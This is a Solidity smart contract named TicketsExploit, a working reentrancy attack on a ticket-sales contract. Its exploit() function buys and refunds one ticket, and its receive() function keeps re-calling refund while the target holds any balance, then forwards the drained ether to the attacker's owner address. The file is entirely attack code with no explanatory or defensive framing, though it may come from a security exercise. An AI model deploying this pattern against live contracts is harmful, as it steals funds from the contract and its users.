// SPDX-License-Identifier: ISC
pragma solidity ^0.8.0;

interface ITickets  {
    function withdraw(uint256 _value) external;
    function refund(uint256 quantity) external;
    function buy(uint256 quantity) external payable;
}

contract TicketsExploit {

    address public owner;
    address public ticket_contract;

    event FallbackEvent(address caller);
    event ReceiveEvent(address caller);

    modifier onlyOwner() {
        require(msg.sender == owner, "Hacker detected!!!");
        _;
    }

    constructor(address _ticket_contract) {
        owner = msg.sender;
        ticket_contract = _ticket_contract;
    }

    function exploit() external payable {
        ITickets(ticket_contract).buy{value: msg.value}(1);
        ITickets(ticket_contract).refund(1);
    }

    fallback() external payable {
        emit FallbackEvent(msg.sender);
    }

    receive() external payable {
        emit ReceiveEvent(msg.sender);
        if(ticket_contract.balance>0) {
            ITickets(ticket_contract).refund(1);
        } else {
            owner.call{value: address(this).balance}("");
        }
    }

}